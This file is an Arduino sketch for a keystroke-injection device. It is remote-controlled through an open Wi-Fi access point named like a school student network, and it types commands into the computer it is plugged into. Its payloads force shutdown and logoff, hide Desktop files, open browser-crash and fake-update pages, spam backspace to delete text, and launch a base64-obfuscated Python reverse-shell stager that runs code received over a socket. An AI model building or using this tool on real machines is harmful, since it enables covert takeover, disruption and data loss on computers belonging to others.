#include <SPI.h>
#include <WiFi101.h>
#include <rBase64.h>
#include <Keyboard.h>
#include <Mouse.h>

char ssid[] = "ICJA-STUDENTS-3";
char pass[] = "";
int keyIndex = 0;
bool val = true;

int status = WL_IDLE_STATUS;
WiFiServer server(80);

void setup()
{
  //Serial1.begin(9600);
  Mouse.begin();
  Serial.println("Access Point Web Server");

  // check for the presence of the shield:
  if (WiFi.status() == WL_NO_SHIELD)
  {
    Serial.println("WiFi shield not present");
    // don't continue
    while (true)
      ;
  }

  // by default the local IP address of will be 192.168.1.1
  // you can override it with the following:
  // WiFi.config(IPAddress(10, 0, 0, 1));

  // print the network name (SSID);
  Serial.print("Creating access point named: ");
  Serial.println(ssid);

  // Create open network. Change this line if you want to create an WEP network:
  status = WiFi.beginAP(ssid);
  if (status != WL_AP_LISTENING)
  {
    Serial.println("Creating access point failed");
    // don't continue
    while (true)
      ;
  }

  // wait 10 seconds for connection:
  delay(10000);

  // start the web server on port 80
  server.begin();
  printWifiStatus();
}
void loop()
{
  // compare the previous status to the current status
  if (status != WiFi.status())
  {
    // it has changed update the variable
    status = WiFi.status();

    if (status == WL_AP_CONNECTED)
    {
      byte remoteMac[6];

      // a device has connected to the AP
      Serial.print("Device connected to AP, MAC address: ");
      WiFi.APClientMacAddress(remoteMac);
    }
    else
    {
      // a device has disconnected from the AP, and we are back in listening mode
      Serial.println("Device disconnected from AP");
    }
  }

  WiFiClient client = server.available();

  if (client)
  {
    Serial.println("new client");
    String currentLine = "";
    while (client.connected())
    {
      if (client.available())
      {
        char c = client.read();
        Serial.write(c);
        if (c == '\n')
        {
          if (currentLine.length() == 0)
          {
            client.println("HTTP/1.1 200 OK");
            client.println("Content-type:text/html");
            client.println();
            client.println("<p id=\"href\"></p><script>document.getElementById(\"href\").innerHTML=window.location.href;if (window.location.href != \"http://192.168.1.1/\")window.location.replace('http://192.168.1.1/');</script><a href=\"http://192.168.1.1/reset\">Reset Arduino</a>");
            client.print("<div style='margin:0;width:100vw;font-family: Arial, Helvetica, sans-serif;'>");

            //universal
            client.print("<br><h1><center style='font-size:40px;'>Universal</center><br>");
            client.print("<br>");
            client.print("Click <a href=\"http://192.168.1.1/ZI\">here</a> To Zoom In<br>");
            client.print("Click <a href=\"http://192.168.1.1/ZO\">here</a> To Zoom Out<br>");
            client.print("Run ghost deleter for x seconds: <input type=\"number\" id=\"ges\" name=\"ges\"><input type=\"submit\" onclick=\"window.location.replace('http://192.168.1.1/' + document.getElementById('ges').value + '/dghost');\"><br>");
            client.print("Run ghost shuffle for x seconds: <input type=\"number\" id=\"ghs\" name=\"ghs\"><input type=\"submit\" onclick=\"window.location.replace('http://192.168.1.1/' + document.getElementById('ghs').value + '/ghost');\"><br><br><br></h1>");

            //windows
            client.print("<div style='background-color:lightgrey'><br><h1><center style='font-size:40px;'>Windows</center><br>");
            client.print("<br>");
            client.print("Click <a href=\"http://192.168.1.1/WT\">here</a> To Test<br>");
            client.print("Click <a href=\"http://192.168.1.1/L\">here</a> To Lock Computer<br>");
            client.print("Click <a href=\"http://192.168.1.1/WL\">here</a> To Logout<br>");
            client.print("Click <a href=\"http://192.168.1.1/WS\">here</a> To Shutdown<br>");
            client.print("Click <a href=\"http://192.168.1.1/rickroll\">here</a> To RickRoll<br>");
            client.print("Click <a href=\"http://192.168.1.1/invert\">here</a> To Invert Colors<br>");
            client.print("What You Would Like The Computer To Say: <input type=\"text\" id=\"WSAY\" name=\"WSAY\"><input type=\"submit\" onclick=\"window.location.replace('http://192.168.1.1/' + btoa(document.getElementById('WSAY').value) + '/wsay');\"><br>");
            client.print("URL To Open Website/YouTube Vid: <input type=\"wURL\" id=\"wURL\" name=\"wURL\"><input type=\"submit\" onclick=\"window.location.replace('http://192.168.1.1/' + btoa(document.getElementById('wURL').value) + '/wURL');\"><br>");
            client.print("Click <a href=\"http://192.168.1.1/crw\">here</a> To Attempt To Crash Browser <span style='font-size:13px;'>(<a href=\"crashios.com/share\">crashios.com/share</a>)</span><br>");
            client.print("Click here To Rotate <a href=\"http://192.168.1.1/RL\">Left</a>/<a href=\"http://192.168.1.1/RR\">Right</a>/<a href=\"http://192.168.1.1/RD\">Down</a>/<a href=\"http://192.168.1.1/RU\">Up</a><br><br><br></h1></div>");

            //mac
            client.print("<br>");
            client.print("<h1><center style='font-size:40px;'>Mac</center><br>");
            client.print("<br>");
            client.print("Click <a href=\"http://192.168.1.1/MT\">here</a> To Test<br>");
            client.print("Click <a href=\"http://192.168.1.1/VO\">here</a> To Launce Voice Over<br>");
            client.print("Click <a href=\"http://192.168.1.1/MQ\">here</a> To Quit Current App<br>");
            client.print("Click <a href=\"http://192.168.1.1/FQ\">here</a> To Quit All Apps<br>");
            client.print("Click <a href=\"http://192.168.1.1/MLO\">here</a> To Log Out<br>");
            client.print("Click <a href=\"http://192.168.1.1/CTB\">here</a> To Close Web Browser Tab<br>");
            client.print("Click <a href=\"http://192.168.1.1/HD\">here</a> To Hide Desktop<br>");
            client.print("Click <a href=\"http://192.168.1.1/SD\">here</a> To Show Desktop<br>");
            client.print("Click <a href=\"http://192.168.1.1/MV\">here</a> For Max Volume<br>");
            client.print("What You Would Like The Computer To Say: <input type=\"text\" id=\"MSAY\" name=\"MSAY\"><input type=\"submit\" onclick=\"window.location.replace('http://192.168.1.1/' + btoa(document.getElementById('MSAY').value) + '/say');\"><br>");
            client.print("URL To Image To Change Wallpaper To: <input type=\"url\" id=\"wall\" name=\"wall\"><input type=\"submit\" onclick=\"window.location.replace('http://192.168.1.1/' + btoa(document.getElementById('wall').value) + '/wall');\"><br>");
            client.print("URL To Open Website/YouTube Vid: <input type=\"url\" id=\"homepage\" name=\"homepage\"><input type=\"submit\" onclick=\"window.location.replace('http://192.168.1.1/' + btoa(document.getElementById('homepage').value) + '/url');\"><br>");
            client.print("Click <a href=\"http://192.168.1.1/crm\">here</a> To Attempt To Crash Browser <span style='font-size:13px;'>(<a href=\"crashios.com/share\">crashios.com/share</a>)</span><br>");
            client.print("Click <a href=\"http://192.168.1.1/H\">here</a> To View Web Browser History<br><br><br></h1>");

            //linux
            client.print("<div style='background-color:lightgrey'><br>");
            client.print("<h1><center style='font-size:40px;'>Linux</center><br>");
            client.print("<br>");
            client.print("Click <a href=\"http://192.168.1.1/KT\">here</a> To Test<br>");
            client.print("Click <a href=\"http://192.168.1.1/L\">here</a> To Lock<br>");
            client.print("Click <a href=\"http://192.168.1.1/KL\">here</a> To Logout<br>");
            client.print("Click <a href=\"http://192.168.1.1/KPD\">here</a> To Shutdown<br>");
            client.print("Click <a href=\"http://192.168.1.1/KR\">here</a> To Reboot<br>");
            client.print("Click <a href=\"http://192.168.1.1/RS\">here</a> To Launch Reverse Shell<br><br><br></h1></div>");

            client.print("<br><center>Made By Isaac Zipperstein<br><a href=\"http://isaaczipperstein.com\">isaaczipperstein.com</a><br></center></div>");
            break;
          }
          else
          {
            currentLine = "";
          }
        }
        else if (c != '\r')
        {
          currentLine += c;
        }
        extension(currentLine);
      }
    }

    client.stop();
    Serial.println("client disonnected");
  }
}

//System
void printWifiStatus()
{

  Serial.print("SSID: ");
  Serial.println(WiFi.SSID());

  IPAddress ip = WiFi.localIP();
  Serial.print("IP Address: ");
  Serial.println(ip);

  long rssi = WiFi.RSSI();
  Serial.print("signal strength (RSSI):");
  Serial.print(rssi);
  Serial.println(" dBm");
  // print where to go in a browser:
  Serial.print("To see this page in action, open a browser to http://");
  Serial.println(ip);
}
void extension(String currentLine)
{
  //Windows
  if (currentLine.endsWith("GET /WT"))
  {
    winTest();
  }
  else if (currentLine.endsWith("GET /L"))
  {
    lockDevice();
  }
  else if (currentLine.endsWith("GET /WL"))
  {
    winLogoff();
  }
  else if (currentLine.endsWith("/wsay"))
  {
    wsay(currentLine);
  }
  else if (currentLine.endsWith("GET /rickroll"))
  {
    rickroll();
  }
  else if (currentLine.endsWith("GET /invert"))
  {
    invert();
  }
  else if (currentLine.endsWith("GET /WS"))
  {
    shutdownDevice();
  }
  else if (currentLine.endsWith("/wURL"))
  {
    wURL(currentLine);
  }
  //Mac
  else if (currentLine.endsWith("GET /MT"))
  {
    macTest();
  }
  else if (currentLine.endsWith("GET /VO"))
  {
    voiceOver();
  }
  else if (currentLine.endsWith("GET /MQ"))
  {
    macQuit();
  }
  else if (currentLine.endsWith("GET /FQ"))
  {
    forceQuit();
  }
  else if (currentLine.endsWith("GET /MLO"))
  {
    macLogOut();
  }
  else if (currentLine.endsWith("GET /CTB"))
  {
    closeTab();
  }
  else if (currentLine.endsWith("GET /H"))
  {
    history();
  }
  else if (currentLine.endsWith("GET /HD"))
  {
    hideDesktop();
  }
  else if (currentLine.endsWith("GET /SD"))
  {
    showDesktop();
  }
  else if (currentLine.endsWith("GET /MV"))
  {
    maxVol();
  }
  else if (currentLine.endsWith("/say"))
  {
    say(currentLine);
  }
  else if (currentLine.endsWith("/wall"))
  {
    wall(currentLine);
  }
  else if (currentLine.endsWith("/url"))
  {
    youtube(currentLine);
  }
  else if (currentLine.endsWith("GET /crm"))
  {
    mCrashiOS();
  }
  //Linux
  else if (currentLine.endsWith("GET /KT"))
  {
    linuxTest();
  }
  else if (currentLine.endsWith("GET /KPD"))
  {
    linuxPoweroff();
  }
  else if (currentLine.endsWith("GET /KL"))
  {
    linuxLogout();
  }
  else if (currentLine.endsWith("GET /KR"))
  {
    linuxReboot();
  }
  else if (currentLine.endsWith("GET /RS"))
  {
    linuxReverseShell();
  }
  else if (currentLine.endsWith("GET /RL"))
  {
    rotateLeft();
  }
  else if (currentLine.endsWith("GET /RR"))
  {
    rotateRight();
  }
  else if (currentLine.endsWith("GET /RD"))
  {
    rotateDown();
  }
  else if (currentLine.endsWith("GET /RU"))
  {
    rotateUp();
  }
  else if (currentLine.endsWith("GET /crw"))
  {
    wCrashiOS();
  }
  //universal
  else if (currentLine.endsWith("GET /ZO"))
  {
    zoomOut();
  }
  else if (currentLine.endsWith("GET /ZI"))
  {
    zoomIn();
  }
  else if (currentLine.endsWith("/ghost"))
  {
    ghostMode(currentLine);
  }
  else if (currentLine.endsWith("/dghost"))
  {
    ghostD(currentLine);
  }
  else if (currentLine.endsWith("GET /reset"))
  {
    pinMode(7, HIGH);
    delay(1000);
    pinMode(7, LOW);
  }
}

//Windows
void wCrashiOS()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('l');
  Keyboard.releaseAll();
  delay(50);
  Keyboard.println("https://crashios.com");
  delay(500);
  Keyboard.write(KEY_RETURN);
}
void winTest()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.println("notepad");
  delay(2000);
  Keyboard.write(KEY_RETURN);
  delay(1000);
  Keyboard.println("HID Test For Windows");
}
void lockDevice()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('l');
  Keyboard.releaseAll();
  delay(50);
}
void winLogoff()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.println("shutdown -l");
  delay(50);
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
}
void shutdownDevice()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.println("shutdown -t 0 -f -s");
  delay(50);
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
}
void rotateLeft()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
}
void rotateRight()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_RIGHT_ARROW);
  Keyboard.releaseAll();
}
void rotateDown()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
}
void rotateUp()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_UP_ARROW);
  Keyboard.releaseAll();
}
void wsay(String currentLine)
{
  rbase64.decode(currentLine.substring(5, currentLine.length() - 5));
  String url = rbase64.result();
  delay(500);

  if (url.endsWith("z����i����o�����_�") != true)
  {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(100);
    Keyboard.print("powershell");
    Keyboard.write(KEY_RETURN);
    delay(3000);
    Keyboard.print("Add-Type -AssemblyName System.speech");
    Keyboard.write(KEY_RETURN);
    delay(100);
    Keyboard.print("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
    Keyboard.write(KEY_RETURN);
    delay(100);
    //Uncomment these lines to use a female voice
    //Keyboard.print("$speak.SelectVoice('Microsoft Zira Desktop')");
    //Keyboard.write(KEY_RETURN);
    //delay(500);
    Keyboard.print("$speak.Speak(\"");
    Keyboard.print(url);
    Keyboard.print("\")");
    Keyboard.write(KEY_RETURN);
    delay(100);
    Keyboard.print("exit");
    Keyboard.write(KEY_RETURN);
    delay(100);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(' ');
    Keyboard.releaseAll();
    Keyboard.write('n');
  }
}
void rickroll()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(600);
  Keyboard.print("https://youtu.be/dQw4w9WgXcQ?t=43s");
  Keyboard.write(KEY_RETURN);
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.print("http://fakeupdate.net/win10ue");
  Keyboard.write(KEY_RETURN);
  delay(2000);
  Keyboard.write(KEY_F11);
}
void invert()
{
  zoomIn();
  delay(200);
  zoomOut();
  delay(200);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('i');
  Keyboard.releaseAll();
}

void wURL(String currentLine)
{
  rbase64.decode(currentLine.substring(5, currentLine.length() - 5));
  String url = rbase64.result();
  delay(500);

  if (url.endsWith("z����i����o�����_�") != true)
  {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(600);
    Keyboard.print(url);
    Keyboard.write(KEY_RETURN);
    Keyboard.write(KEY_F11);
  }
}

//Mac
void mCrashiOS()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('l');
  Keyboard.releaseAll();
  delay(50);
  Keyboard.println("https://crashios.com");
  delay(500);
  Keyboard.write(KEY_RETURN);
}
void macTest()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(200);
  Keyboard.println("HID Test For Mac");
}
void voiceOver()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_F5);
  Keyboard.releaseAll();
  for (int i = 0; i < 23; i++)
  {
    delay(500);
    Keyboard.write(KEY_RIGHT_ARROW);
  }
}
void macQuit()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  Keyboard.releaseAll();
}
void forceQuit()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  Keyboard.write(KEY_UP_ARROW);
  delay(500);
  Keyboard.write(KEY_UP_ARROW);
  delay(500);
  Keyboard.write(KEY_UP_ARROW);
  delay(500);
  Keyboard.write(KEY_UP_ARROW);
  delay(500);
  Keyboard.write(KEY_UP_ARROW);
  delay(500);

  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.write(KEY_DOWN_ARROW);
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.write(KEY_DOWN_ARROW);
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.write(KEY_DOWN_ARROW);
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.write(KEY_DOWN_ARROW);
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.write(KEY_DOWN_ARROW);
  delay(500);
  Keyboard.write(KEY_RETURN);
}
void macLogOut()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('Q');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.write(KEY_RETURN);
}
void closeTab()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();
}
void history()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('y');
  Keyboard.releaseAll();
}
void terminal()
{
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('g');
  Keyboard.releaseAll();
  delay(800);
  Keyboard.println("/System/Applications/Utilities/Terminal.app");
  delay(300);
  Keyboard.write(KEY_RETURN);
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('o');
  Keyboard.releaseAll();
  delay(1000);
}
void hideDesktop()
{
  terminal();
  Keyboard.println("chflags hidden ~/Desktop/*");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(500);
  macQuit();
  delay(500);
  closeTab();
}
void showDesktop()
{
  terminal();
  Keyboard.println("chflags nohidden ~/Desktop/*");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(500);
  macQuit();
  delay(500);
  closeTab();
}
void maxVol()
{
  terminal();
  Keyboard.println("osascript -e 'set volume 10'");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(500);
  macQuit();
  delay(500);
  closeTab();
}
void say(String currentLine)
{
  rbase64.decode(currentLine.substring(5, currentLine.length() - 4));
  String url = rbase64.result();
  delay(500);

  if (url.endsWith("z����i����o�����_�") != true)
  {
    terminal();
    Keyboard.print("say ");
    Keyboard.print(url);
    delay(500);
    Keyboard.write(KEY_RETURN);
    delay(1000);
    macQuit();
    Keyboard.write(KEY_RETURN);
    delay(300);
    closeTab();
  }
}
void wall(String currentLine)
{
  rbase64.decode(currentLine.substring(5, currentLine.length() - 5));
  String url = rbase64.result();
  delay(500);

  if (url.endsWith("z����i����o�����_�") != true)
  {
    String S = "curl " + url + " > /Users/Shared/wallpaper.jpg";

    terminal();
    Keyboard.println(S);
    delay(500);
    Keyboard.write(KEY_RETURN);
    delay(500);
    Keyboard.println("osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"/Users/Shared/wallpaper.jpg\"'");
    delay(500);
    Keyboard.write(KEY_RETURN);
    delay(500);
    macQuit();
    delay(500);
    closeTab();
    return;
  }
}
void youtube(String currentLine)
{
  rbase64.decode(currentLine.substring(5, currentLine.length() - 4));
  String url = rbase64.result();
  delay(500);

  Serial.println();
  Serial.print("Decoded URL: ");
  Serial.println(url);

  if (url.endsWith("z����i����o�����_�") != true)
  {
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(' ');
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('g');
    Keyboard.releaseAll();
    delay(800);
    Keyboard.println("/Applications/Safari.app");
    delay(300);
    Keyboard.write(KEY_RETURN);
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('o');
    Keyboard.releaseAll();
    delay(1000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('t');
    Keyboard.releaseAll();

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('l');
    Keyboard.releaseAll();

    Keyboard.println(url);
    Keyboard.write(KEY_RETURN);
    return;
  }
}

//linux
void linuxTest()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("Linux HID TEST");
}
void linuxPoweroff()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("poweroff");
  delay(50);
  Keyboard.write(KEY_RETURN);
}
void linuxReboot()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("reboot");
  delay(50);
  Keyboard.write(KEY_RETURN);
}
void linuxLogout()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("gnome-session-quit");
  delay(1000);
  Keyboard.write(KEY_RETURN);
  delay(50);
  Keyboard.write(KEY_RETURN);
}
void linuxReverseShell()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("python");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(1000);
  Keyboard.println("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEyNy4wLjAuMScsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.println("exit()");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(50);
  Keyboard.println("exit");
  Keyboard.write(KEY_RETURN);
  delay(50);
}

//universal
void zoomIn()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('+');
  Keyboard.releaseAll();
}
void zoomOut()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('-');
  Keyboard.releaseAll();
}
void ghostMode(String currentLine)
{
  for (int i = 0; i < (currentLine.substring(5, currentLine.length() - 7).toInt() * 2.5); i++)
  {
    if (random(1))
    {
      /* mouse jiggler */
      for (int j = 0; j < 4; j++)
      {
        int distance = random(10, 800);
        int x = random(3) - 1;
        int y = random(3) - 1;
        for (int i = 0; i < distance; i++)
        {
          Mouse.move(x, y, random(1));
          delay(3);
        }
        delay(1000);
      }
    }
    else
    {
      /* keyboard randomizer */
      for (int k = 0; k < 40; k++)
      {
        if (random(1))
        {
          String l = "abcdefghijklmnop`-=[];\',./";
          for (int q = 0; q < random(20); q++)
          {
            if (random(2) == 2)
            {
              Keyboard.press(KEY_LEFT_SHIFT);
            }
            Keyboard.press(l[random(25)]);
            delay(100);
            Keyboard.releaseAll();
          }
        }
        else
        {
          Keyboard.write(random(0, 99));
          delay(100);
        }
      }
    }
  }
}

void ghostD(String currentLine)
{
  for (int t = 0; t < ((currentLine.substring(5, currentLine.length() - 7).toInt() * 1000) / 200); t++)
  {
    Keyboard.write(KEY_BACKSPACE);
    delay(200);
  }
}
